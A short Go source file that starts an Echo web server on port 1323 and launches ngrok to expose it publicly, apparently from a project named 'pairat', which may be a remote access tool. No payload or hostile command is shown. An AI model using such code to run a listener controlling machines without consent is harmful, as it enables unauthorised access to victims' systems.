package server

import (
	routes "github.com/paij0se/pairat/src/routes"
	tools "github.com/paij0se/pairat/src/tools"

	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
)

func StartServer() {
	tools.Clear()
	tools.KillProcess()
	tools.Welcome()
	tools.ExecuteNgrok()
	e := echo.New()
	e.Use(middleware.Recover())
	routes.Get(e)
	routes.Post(e)
	e.Logger.Fatal(e.Start(":1323"))

}
